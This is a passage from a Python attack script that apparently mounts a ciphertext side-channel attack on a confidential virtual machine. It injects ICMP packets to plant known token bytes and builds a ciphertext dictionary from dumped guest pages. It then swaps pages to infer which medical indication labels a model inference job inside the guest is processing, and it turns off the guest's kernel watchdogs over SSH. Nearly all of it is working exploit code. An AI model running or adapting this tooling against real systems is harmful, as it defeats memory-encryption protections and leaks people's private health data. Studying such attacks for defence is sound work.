                N_found = tok_start - HEADER_CONST
                log(f"[blind] MATCH: tok_start={tok_start}  N={N_found}  "
                    f"token_idx={token_idx}  '{label}'  ind_gpa=0x{ind_gpa:x}")
                post_path = HERE / f"blind_p2_ts{tok_start}_t{token_idx}.out"
                post_path.write_text(_bytes_to_xp_dump(dict_gpa, raw) + "\n")
                return tok_start, ind_gpa, token_idx
            _n_mismatch += 1

    log_err(f"[blind] No match found  swap_ok={_n_swap_ok} swap_fail={_n_swap_fail} "
            f"swap_self={_n_swap_self} cp_fail={_n_cp_fail} "
            f"no_blocks={_n_no_blocks} mismatch={_n_mismatch}")
    return None, None, None


# ---------------------------------------------------------------------------
# Phase 0: pre-build dictionary
# ---------------------------------------------------------------------------

VALID_INDICES_CACHE = HERE / "valid_indices.json"
COMBO_CONST_CACHE   = HERE / "combo_const.json"
INDEX_CONST_CACHE   = HERE / "index_const.json"

# Per-index HEADER_CONST overrides loaded from index_const.json at startup.
# Key is str(index) to match JSON keys.  Falls back to global HEADER_CONST.
_index_const: dict[str, int] = {}


def _sample_combo_key(sample: dict) -> str:
    """Canonical key for the metadata combination that determines HEADER_CONST."""
    return "age=%d sex=%d eth=%d" % (
        bool(sample.get("age")),
        bool(sample.get("sex")),
        bool(sample.get("ethnicGroup")),
    )


def scan_matching_indices(dataset_path: str = GUEST_DATASET_DEFAULT) -> list[int]:
    """Return sorted dataset indices whose indication contains any TOKEN_LABELS label.

    If valid_indices.json exists in the script directory, load from it directly.
    """
    if VALID_INDICES_CACHE.exists():
        with open(VALID_INDICES_CACHE) as f:
            indices = sorted(json.load(f))
        log(f"[scan] Loaded {len(indices)} pre-filtered indices from {VALID_INDICES_CACHE.name}")
        return indices

    labels = [label for label, _ in TOKEN_LABELS]
    log(f"[scan] Scanning dataset for: {labels}")
    script = f"""
import json, os
with open(os.path.expanduser({dataset_path!r})) as f:
    raw = f.read().strip()
data = json.loads(raw) if raw.startswith('[') else [json.loads(l) for l in raw.splitlines() if l.strip()]
labels = {labels!r}
for i, s in enumerate(data):
    ind = s.get('indication') or ''
    if any(lb in ind for lb in labels):
        print(i)
"""
    proc = subprocess.Popen(SSH_BASE + ["python3 -"],
                            stdin=subprocess.PIPE, stdout=subprocess.PIPE,
                            stderr=subprocess.PIPE, text=True)
    stdout, stderr = proc.communicate(input=script)
    if proc.returncode != 0 or not stdout.strip():
        log_err(f"[scan] failed: {stderr.strip()}")
        return []
    indices = sorted({int(x) for x in stdout.splitlines() if x.strip().isdigit()})
    log(f"[scan] {len(indices)} matching samples found")
    return indices


def drain_guest_rxbuf() -> None:
    """Open a temporary raw ICMP socket on the guest to flush queued packets."""
    out = ssh(
        "sudo python3 << 'PYEOF'\n"
        "import socket, select\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n"
        "s.setblocking(False)\n"
        "n = 0\n"
        "while select.select([s], [], [], 0.3)[0]:\n"
        "    try:\n"
        "        s.recv(65536)\n"
        "        n += 1\n"
        "    except OSError:\n"
        "        break\n"
        "s.close()\n"
        "print(f'drained {n} pkts')\n"
        "PYEOF",
        timeout=20,
    )
    log(f"  [drain] {out.strip()}")


def _acquire_with_retry(token_idx: int, prefix: int = 0,
                        retries: int = 5) -> tuple[int, int]:
    """Call acquire_token_gpa with exponential back-off on RuntimeError."""
    for attempt in range(retries):
        try:
            return acquire_token_gpa(token_idx, prefix)
        except RuntimeError as e:
            log_err(f"  {e} (attempt {attempt + 1}/{retries})")
            if attempt < retries - 1:
                wait = 10 * (attempt + 1)
                log(f"  sleeping {wait}s before retry...")
                time.sleep(wait)
    raise RuntimeError(f"acquire_token_gpa failed after {retries} attempts")


def build_dict(swap_tool: str) -> dict:
    """
    Build phase: one ICMP send per (token_idx, phase) covers all offsets at L-byte intervals.

    For token_idx with token_ids of byte-length L = len(token_ids)*8:
      n_phases = L // 8   (2 for 2-token labels, 4 for 4-token labels)
      phase p targets landing offset p*8 within the page.
      The payload repeats token_bytes every L bytes, so ONE dump covers offsets
        p*8, p*8+L, p*8+2L, ... — all 4096/L positions at once.

    Total sends for current TOKEN_LABELS (7×24B + 16×32B + 1×32B sentinel):
      ~3 sends/phase × ~100 phases

    Saves dict_cache.json and per-phase ciphertext files in dict_pages/.
    Resumes automatically: phases whose .out file already exists are skipped.
    Returns {token_offset_hex: {token_idx_str: {gpa, cp_file, landing_ok}}}.
    """
    DICT_DIR.mkdir(exist_ok=True)

    # Always start fresh — remove existing cache and all dict page files.
    if DICT_CACHE.exists():
        DICT_CACHE.unlink()
        log("[build] Removed existing dict_cache.json")
    for f in DICT_DIR.glob("*.out"):
        f.unlink()
    log(f"[build] Cleared {DICT_DIR.name}/ — building from scratch")

    cache = {}

    total_phases = sum(len(ids) for _, ids in TOKEN_LABELS)
    phase_num    = 0
    drain_count  = 0

    for token_idx, (label, token_ids) in enumerate(TOKEN_LABELS):
        L        = len(token_ids) * 8   # payload repeat period in bytes
        n_phases = L // 8               # number of distinct 8-byte-aligned starting positions

        # Ring-state carried across phases of the same token_idx.
        # After phase 0 probes, delta is stable (same payload size throughout).
        # Each subsequent phase predicts expected_frag from the previous
        # aligned send's actual_frag_p1, saving 2 probe sends per phase.
        _tok_delta        = None   # ring advance per send (constant for same payload size)
        _tok_frag_p1_last = None   # frag_p1 returned by the most recent actual send

        for phase in range(n_phases):
            phase_num    += 1
            target_landing = phase * 8
            cp_name = f"t{token_idx}_p{phase}"
            cp_path = DICT_DIR / f"{cp_name}.out"

            # Determine which offsets this phase covers
            covered = [target_landing + k * L
                       for k in range(4096 // L + 1)
                       if target_landing + k * L < 4096]

            # Skip if dump exists and all covered offsets are registered
            if cp_path.exists() and all(
                hex(o) in cache and str(token_idx) in cache[hex(o)]
                for o in covered
            ):
                log(f"[build {phase_num}/{total_phases}] token_idx={token_idx} '{label}'"
                    f"  phase={phase}  [skip — {len(covered)} offsets already registered]")
                # Skipped phase: ring state unknown, cannot carry forward
                _tok_delta = _tok_frag_p1_last = None
                continue

            log(f"\n[build {phase_num}/{total_phases}] token_idx={token_idx} '{label}'"
                f"  L={L}B  n_phases={n_phases}  phase={phase}"
                f"  target_landing=0x{target_landing:x}"
                f"  covers {len(covered)} offsets")

            drain_count += 1
            if drain_count % DRAIN_EVERY == 0:
                log("  [drain] flushing guest ICMP receive buffer...")
                drain_guest_rxbuf()

            # Retry until exact landing at target_landing.
            # Wrong-landing entries are kept (valid for their actual offsets).
            # Ring state is carried across retries → 1 packet per retry, no re-probe.
            _MAX_LANDING_TRIES = 20   # ring period = 4096/L ≤ 512; 20 is more than enough

            _REPROBE_AFTER = 5   # re-measure delta if error persists after this many retries

            for _lattempt in range(_MAX_LANDING_TRIES):
                if _lattempt > 0:
                    error = (actual_landing - target_landing) % 4096
                    if _lattempt % _REPROBE_AFTER == 0:
                        # Error persists — re-probe from scratch (4 packets: 2 small + 2 large).
                        log(f"  [landing-reprobe] {_lattempt} retries failed"
                            f" — re-measuring delta (4 packets)")
                        _tok_delta = _tok_frag_p1_last = None
                    else:
                        # Backup: correct carried delta using observed landing error.
                        # Triggered only when large probes failed and fell back to small delta.
                        _tok_delta = (_tok_delta - error) % 4096
                        log(f"  [landing-retry {_lattempt}/{_MAX_LANDING_TRIES-1}] "
                            f"actual=0x{actual_landing:x} ≠ target=0x{target_landing:x}"
                            f"  error=0x{error:x}  delta corrected → {_tok_delta}"
                            f"  (1 packet)")

                # Probe only when ring state is unknown (first phase or after a skip/error).
                # Subsequent phases carry delta + frag_p1 from the previous aligned send.
                if _tok_frag_p1_last is not None and _tok_delta is not None:
                    expected_frag = (_tok_frag_p1_last - _tok_delta) % 4096
                    log(f"  [no-probe] carried ring state:"
                        f"  frag_p1_last={_tok_frag_p1_last}  delta={_tok_delta}"
                        f"  expected_frag={expected_frag}")
                else:
                    # Phase 1: two small probes (prefix=0) → rough ring position.
                    try:
                        log("  [probe1] prefix=0 ...")
                        _, frag_p1_a = _acquire_with_retry(token_idx, prefix=0)
                        log("  [probe2] prefix=0 ...")
                        _, frag_p1_b = _acquire_with_retry(token_idx, prefix=0)
                    except RuntimeError as e:
                        log_err(f"  [!] Probe failed: {e} — draining RX buf then skipping phase")
                        drain_guest_rxbuf()
                        _tok_delta = _tok_frag_p1_last = None
                        break
                    _delta_small  = (frag_p1_a - frag_p1_b) % 4096
                    _efrag_rough  = (frag_p1_b - _delta_small) % 4096
                    log(f"  [small-probe] frag_p1: {frag_p1_a},{frag_p1_b}"
                        f"  delta_small={_delta_small}  expected_rough={_efrag_rough}")

                    # Phase 2: two large probes matching aligned-send packet size.
                    # delta varies with packet size (ring advance ≈ packet_bytes % 4096),
                    # so delta_small (prefix=0) ≠ delta for the large aligned send.
                    _large_pfx = target_landing + _efrag_rough
                    try:
                        log(f"  [probe3] prefix={_large_pfx} (large) ...")
                        _, frag_p1_c = _acquire_with_retry(token_idx, prefix=_large_pfx)
                        log(f"  [probe4] prefix={_large_pfx} ...")
                        _, frag_p1_d = _acquire_with_retry(token_idx, prefix=_large_pfx)
                    except RuntimeError as e:
                        log_err(f"  [!] Large probe failed: {e} — falling back to small delta")
                        _tok_delta    = _delta_small
                        expected_frag = _efrag_rough
                    else:
                        _tok_delta    = (frag_p1_c - frag_p1_d) % 4096
                        expected_frag = (frag_p1_d - _tok_delta) % 4096
                        log(f"  [large-probe] frag_p1: {frag_p1_c},{frag_p1_d}"
                            f"  delta_large={_tok_delta}  expected={expected_frag}")

                prefix = target_landing + expected_frag
                log(f"  prefix={prefix}")

                # Aligned send
                try:
                    dict_gpa, actual_frag_p1 = _acquire_with_retry(token_idx, prefix=prefix)
                except RuntimeError as e:
                    log_err(f"  [!] Aligned send failed: {e} — draining RX buf then skipping phase")
                    drain_guest_rxbuf()
                    _tok_frag_p1_last = None   # ring state lost
                    break

                _tok_frag_p1_last = actual_frag_p1
                actual_landing = (prefix - actual_frag_p1) % 4096
                landing_ok     = (actual_landing == target_landing)
                log(f"  dict_gpa=0x{dict_gpa:x}  actual_frag_p1={actual_frag_p1}"
                    f"  actual_landing=0x{actual_landing:x}"
                    f"  {'OK' if landing_ok else f'MISMATCH (expected 0x{target_landing:x})'}")

                # Dump the full 4 KB page — one dump covers all L-spaced offsets
                run("read_gpa (dict build)",
                    [sys.executable, str(READ_GPA), str(DICT_DIR / cp_name), f"0x{dict_gpa:x}"])
                log(f"  dump -> {cp_path.name}")

                # Register every offset where the token lands in this page.
                # Wrong landings are also registered — valid ciphertext for those offsets,
                # and will be overwritten when the correct landing succeeds.
                actual_covered = []
                for k in range(4096 // L + 1):
                    offset = actual_landing + k * L
                    if offset >= 4096:
                        break
                    off_key = hex(offset)
                    if off_key not in cache:
                        cache[off_key] = {}
                    cache[off_key][str(token_idx)] = {
                        "gpa":        hex(dict_gpa),
                        "cp_file":    str(cp_path),
                        "landing_ok": landing_ok,
                    }
                    actual_covered.append(off_key)
                log(f"  registered {len(actual_covered)} offsets: "
                    f"{actual_covered[:4]}{'...' if len(actual_covered) > 4 else ''}")

                if actual_landing == target_landing:
                    break
                # Ring state updated (_tok_frag_p1_last = actual_frag_p1);
                # next iteration re-predicts without probes.
            else:
                log_err(f"  [!] Could not land at 0x{target_landing:x} after "
                        f"{_MAX_LANDING_TRIES} attempts — partial coverage only")

        # Persist after each token_idx
        with open(DICT_CACHE, "w") as f:
            json.dump(cache, f, indent=2)

    built = sum(len(v) for v in cache.values())
    log(f"[build] Complete. {built} (offset×token) entries in {DICT_CACHE}")
    log("[build] Draining guest ICMP receive buffer (freeing accumulated packet pages)...")
    drain_guest_rxbuf()
    return cache


# ---------------------------------------------------------------------------
# Phase 1: inference + compare
# ---------------------------------------------------------------------------

def compare_with_dict(cache: dict,
                      indication_page_gpa: int,
                      token_offset: int,
                      swap_tool: str,
                      n_scan: int = 20) -> tuple[int | None, str]:
    """
    Compare indication page against pre-built dictionary.

    Scans forward up to n_scan tokens from token_offset so that TOKEN_LABEL
    matches are found even when the label starts mid-indication (e.g.
    'Cough, shortness of breath' → label 'shortness of breath' starts at +3 tokens).

    For each scan step the indication page is swapped to the matching dict_gpa and
    the ciphertext is compared at (token_offset + step*8) within the page.

    Returns (matched_token_idx, verdict).
    """
    log(f"[compare] indication_page_gpa=0x{indication_page_gpa:x}"
        f"  token_offset=0x{token_offset:x}  n_scan={n_scan}")

    found_any_dict = False
    for scan_step in range(n_scan + 1):
        scan_offset = (token_offset + scan_step * 8) & 0xFFF
        off_key = hex(scan_offset)
        if off_key not in cache:
            continue

        entries = cache[off_key]
        for token_idx in _LABEL_ORDER:
            label, token_ids = TOKEN_LABELS[token_idx]
            entry = entries.get(str(token_idx))
            if entry is None:
                if scan_step == 0:
                    log_err(f"  [!] No dict entry for token_idx={token_idx}, skipping")
                continue

            found_any_dict = True
            dict_gpa      = int(entry["gpa"], 16)
            cp_path       = Path(entry["cp_file"])
            token_ids_str = ",".join(str(i) for i in token_ids)

            if scan_step == 0:
                log(f"[compare] token_idx={token_idx}  '{label}'")
            else:
                log(f"[compare] scan+{scan_step} scan_offset=0x{scan_offset:03x}"
                    f"  token_idx={token_idx}  '{label}'")
            log(f"  swap-back read: dict_gpa=0x{dict_gpa:x}  src=0x{indication_page_gpa:x}")

            post_name = f"post_off{scan_offset:04x}_t{token_idx}"
            post_path = HERE / f"{post_name}.out"
            do_swap_read(swap_tool, dict_gpa, indication_page_gpa, post_path)

            r = subprocess.run([
                sys.executable, str(VERIFY), "verify",
                "--cp",           str(cp_path),
                "--post",         str(post_path),
                "--token-offset", hex(scan_offset),
                "--token-ids",    token_ids_str,
            ], capture_output=True, text=True)
            for line in r.stdout.splitlines():
                log(f"  {line}")
            if r.stderr:
                for line in r.stderr.splitlines():
                    log_err(f"  {line}")

            if "Result: MATCH ✓" in r.stdout:
                log(f"[compare] MATCH -> scan+{scan_step}  token_idx={token_idx}  '{label}'")
                return token_idx, "MATCH"

    if not found_any_dict:
        log_err(f"[!] No dict entries found in scan range [+0,+{n_scan}] tokens")
        return None, "NO_DICT"

    log("[compare] No match found across all dictionary entries")
    return None, "MISMATCH"


# ---------------------------------------------------------------------------
# result logging
# ---------------------------------------------------------------------------

def save_result(index: int, token_idx_found: int | None,
                verdict: str, indication_gpa: int,
                save_csv: bool = False) -> None:
    if token_idx_found is not None:
        label, ids = TOKEN_LABELS[token_idx_found]
        token_ids_str = ",".join(str(i) for i in ids)
    else:
        label, token_ids_str = "-", "-"

    log(f"  result saved: {RESULTS_CSV}  [{verdict}]")

    if not save_csv:
        return

    row = {
        "timestamp":      datetime.datetime.now().strftime("%Y-%m-%dT%H:%M:%S"),
        "index":          index,
        "verdict":        verdict,
        "token_label":    label,
        "token_ids":      token_ids_str,
        "indication_gpa": f"0x{indication_gpa:x}",
    }
    write_header = not RESULTS_CSV.exists()
    with open(RESULTS_CSV, "a", newline="") as f:
        w = csv.DictWriter(f, fieldnames=list(row.keys()))
        if write_header:
            w.writeheader()
        w.writerow(row)


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------

def main() -> None:
    ssh("echo 0 | sudo tee /proc/sys/kernel/watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/nmi_watchdog > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/softlockup_panic > /dev/null 2>&1 ; "
        "echo 0 | sudo tee /proc/sys/kernel/hardlockup_panic > /dev/null 2>&1 ; "
        "echo 1 | sudo tee /proc/sys/kernel/rcu_cpu_stall_suppress > /dev/null 2>&1 ; "
        "echo never | sudo tee /sys/kernel/mm/transparent_hugepage/enabled > /dev/null 2>&1",
        timeout=30)

    p = argparse.ArgumentParser(
        description=__doc__,
        formatter_class=argparse.RawDescriptionHelpFormatter,
    )
    p.add_argument("--build", action="store_true",
                   help="Pre-build dictionary (phase-based: ~36 sends total) then exit")
    p.add_argument("--calibrate", action="store_true",
                   help="Sweep HEADER_CONST candidates to find the correct value")
    p.add_argument("--blind", action="store_true",
                   help="Sweep tok_start (HEADER_CONST+N) without using guest-reported N")
    p.add_argument("--calibrate-index", type=int, default=0,
                   help="Dataset index to use for calibration (default: 0)")
    p.add_argument("--index", type=int, default=None,
                   help="Single dataset index")
    p.add_argument("--all-indices", action="store_true",
                   help="Iterate all dataset indices sequentially (guest keeps running inference)")
    p.add_argument("--reverse", action="store_true",
                   help="Iterate indices in descending order (highest index first)")
    p.add_argument("--start-index", type=int, default=None,
                   help="Boundary index: ascending→skip below, descending→skip above (default: no filter)")
    p.add_argument("--guest-script",   default=GUEST_SCRIPT_DEFAULT)
    p.add_argument("--guest-cwd",      default=GUEST_CWD_DEFAULT)
    p.add_argument("--guest-python",   default=GUEST_PYTHON_DEFAULT)
    p.add_argument("--guest-dataset",  default=GUEST_DATASET_DEFAULT,
                   help="Path to dataset JSON on guest (for --all-indices count)")
    p.add_argument("--header-const",   type=int, default=None)
    p.add_argument("--swap-tool",      default=str(SWAP_TOOL))
    p.add_argument("--dict-cache",     default=str(DICT_CACHE),
                   help="Path to pre-built dictionary JSON (default: dict_cache.json)")
    p.add_argument("--log-file",       default=None,
                   help="Append all log output to this file (in addition to stdout)")
    p.add_argument("--save-csv",       action="store_true",
                   help="Append results to results_v2.csv")
    p.add_argument("--rebuild-every",  type=int, default=None, metavar="N",
                   help="Rebuild dictionary every N samples during --all-indices")
    p.add_argument("--n-scan", type=int, default=20, metavar="N",
                   help="Scan forward up to N tokens from indication_gpa when comparing (default: 20)")
    p.add_argument("--calibrate-combos", action="store_true",
                   help="Calibrate HEADER_CONST for every metadata combo; saves combo_const.json")
    p.add_argument("--build-index-const", action="store_true",
                   help="Generate index_const.json + expand valid_indices from combo_const.json")
    args = p.parse_args()

    global HEADER_CONST, _log_fh, _index_const
    if args.header_const is not None:
        HEADER_CONST = args.header_const
    if args.log_file:
        _log_fh = open(args.log_file, "a")
        log(f"=== session start  log -> {args.log_file} ===")

    # Load per-index HEADER_CONST overrides
    if INDEX_CONST_CACHE.exists():
        with open(INDEX_CONST_CACHE) as f:
            _index_const = json.load(f)
        log(f"[index-const] Loaded {len(_index_const)} per-index HEADER_CONST overrides")

    # ── Calibrate all metadata combos ──────────────────────────────────────
    if args.calibrate_combos:
        dict_cache_path = Path(args.dict_cache)
        if not dict_cache_path.exists():
            print(f"[!] dict_cache not found: {dict_cache_path}", file=sys.stderr)
            sys.exit(1)
        with open(dict_cache_path) as f:
            cache = json.load(f)
        calibrate_all_combos(args.swap_tool, cache,
                             args.guest_script, args.guest_cwd, args.guest_python)
        if _log_fh:
            _log_fh.close()
        return

    # ── Build index_const.json from combo_const.json ────────────────────────
    if args.build_index_const:
        if not COMBO_CONST_CACHE.exists():
            print(f"[!] combo_const.json not found — run --calibrate-combos first",
                  file=sys.stderr)
            sys.exit(1)
        with open(COMBO_CONST_CACHE) as f:
            combo_const = json.load(f)
        build_index_const(combo_const)
        if _log_fh:
            _log_fh.close()
        return

    # ── Phase 0: pre-build ──────────────────────────────────────────────────
    if args.build:
        total_phases = sum(len(ids) for _, ids in TOKEN_LABELS)
        total_sends  = total_phases * 3   # 2 probes + 1 aligned send per phase
        log(f"[build] {len(TOKEN_LABELS)} tokens  {total_phases} phases  "
            f"~{total_sends} sends total")
        build_dict(args.swap_tool)
        return

    # ── Phase 1: load dict ──────────────────────────────────────────────────
    if not args.build:
        if args.index is None and not args.all_indices and not args.calibrate:
            p.error("one of --index, --all-indices, --calibrate, or --build is required")

        dict_cache_path = Path(args.dict_cache)
        if not dict_cache_path.exists():
            print(f"[!] dict_cache not found: {dict_cache_path}", file=sys.stderr)
            print("[!] Run with --build first.", file=sys.stderr)
            sys.exit(1)

        with open(dict_cache_path) as f:
            cache = json.load(f)
        log(f"[dict] Loaded {len(cache)} token_offset entries from {dict_cache_path}")

    # ── Phase 1a: calibrate HEADER_CONST ───────────────────────────────────
    if args.calibrate:
        h = calibrate_header_const(
            args.calibrate_index, args.swap_tool, cache,
            args.guest_script, args.guest_cwd, args.guest_python)
        if h is not None:
            log(f"[calibrate] Done. Use --header-const {h} in future runs.")
        if _log_fh:
            _log_fh.close()
        return

    # ── Phase 1b: single index ──────────────────────────────────────────────
    if args.index is not None:
        _run_single(args, cache, args.index)
        if _log_fh:
            _log_fh.close()
        return

    # ── Phase 1c: all indices ───────────────────────────────────────────────
    if args.all_indices:
        indices = scan_matching_indices(args.guest_dataset)
        if not indices:
            log_err("[all-indices] No matching samples found in dataset — aborting")
            if _log_fh:
                _log_fh.close()
            return

        if args.reverse:
            if args.start_index is not None:
                indices = [i for i in indices if i <= args.start_index]
            indices = list(reversed(indices))
        else:
            if args.start_index is not None:
                indices = [i for i in indices if i >= args.start_index]
        order_str = f"desc  start_index<={args.start_index}" if args.reverse else f"asc  start_index>={args.start_index}"
        log(f"[all-indices] {len(indices)} matching samples  order={order_str}")

        consecutive_fails = 0
        for pos, idx in enumerate(indices):
            log(f"\n{'='*60}")
            log(f"[all-indices] index={idx}  ({pos+1}/{len(indices)})")
            try:
                _run_single(args, cache, idx)
                consecutive_fails = 0
            except SystemExit as e:
                if e.code != 0:
                    consecutive_fails += 1
                    log_err(f"[!] index={idx} failed (exit {e.code})"
                            f"  consecutive_fails={consecutive_fails}")
                    if not _guest_alive():
                        log_err("[!] Guest VM is down (segfault / OOM?) — waiting for recovery")
                        if _wait_guest_alive():
                            log("[recovery] Guest back online — resetting fail counter")
                            consecutive_fails = 0
                        else:
                            log_err("[!] Guest recovery timed out — aborting")
                            break
                    elif consecutive_fails >= 5:
                        log_err("[!] 5 consecutive failures (guest alive) — aborting")
                        break

            if (args.rebuild_every
                    and (pos + 1) % args.rebuild_every == 0
                    and pos + 1 < len(indices)):
                log(f"\n[rebuild] {pos+1} samples done — rebuilding dictionary "
                    f"(next: index={indices[pos+1]})...")
                cache = build_dict(args.swap_tool)
                log(f"[rebuild] Done. {len(cache)} offset entries loaded.")

            time.sleep(2)

        log("[all-indices] Done.")
        if _log_fh:
            _log_fh.close()


def _run_single(args, cache: dict, index: int) -> None:
    if getattr(args, "blind", False):
        _BLIND_RETRIES = 3
        tok_start, indication_gpa, token_idx_found = None, None, None
        for _attempt in range(_BLIND_RETRIES):
            if _attempt > 0:
                log(f"  [blind-retry] attempt {_attempt+1}/{_BLIND_RETRIES} "
                    f"(prev base_gpa not in swap-compatible range)")
                time.sleep(2)
            log(f"[1/2] Acquiring base_gpa only — blind mode (index={index}, "
                f"attempt={_attempt+1}/{_BLIND_RETRIES})...")
            base_gpa, _, guest_proc = _acquire_gpa_raw(
                index, args.guest_script, args.guest_cwd, args.guest_python,
                base_only=True)
            if base_gpa is None:
                sys.exit(1)
            try:
                log("[2/2] Sweeping tok_start (HEADER_CONST+N) via ciphertext comparison...")
                tok_start, indication_gpa, token_idx_found = sweep_blind(
                    base_gpa, cache, args.swap_tool)
            finally:
                if guest_proc is not None:
                    try:
                        guest_proc.stdin.close()
                        guest_proc.wait(timeout=10)
                    except Exception:
                        guest_proc.kill()
            if token_idx_found is not None:
                break
        verdict = "MATCH" if token_idx_found is not None else "MISMATCH"
        save_result(index, token_idx_found, verdict,
                    indication_gpa or 0, save_csv=args.save_csv)
        log("Done.")
        return

    token_idx_found, verdict, indication_gpa = None, "MISMATCH", 0

    idx_hc = _index_const.get(str(index))
    if idx_hc is not None and idx_hc != HEADER_CONST:
        log(f"  [header_const] index={index} → {idx_hc} (override)")
    log(f"[1/2] Acquiring indication GPA (index={index})...")
    indication_gpa, guest_proc = acquire_indication_gpa(
        index, args.guest_script, args.guest_cwd, args.guest_python,
        header_const=idx_hc)
    if indication_gpa is None:
        sys.exit(1)

    indication_page_gpa = indication_gpa & ~0xFFF
    token_offset        = indication_gpa & 0xFFF
    log(f"  indication_page_gpa=0x{indication_page_gpa:x}  token_offset=0x{token_offset:x}")

    try:
        log("[2/2] Comparing with pre-built dictionary...")
        token_idx_found, verdict = compare_with_dict(
            cache, indication_page_gpa, token_offset, args.swap_tool,
            n_scan=args.n_scan)
    finally:
        if guest_proc is not None:
            try:
                guest_proc.stdin.close()
                guest_proc.wait(timeout=10)
            except Exception:
                guest_proc.kill()

    save_result(index, token_idx_found, verdict, indication_gpa,
                save_csv=args.save_csv)
    log("Done.")


if __name__ == "__main__":
    main()
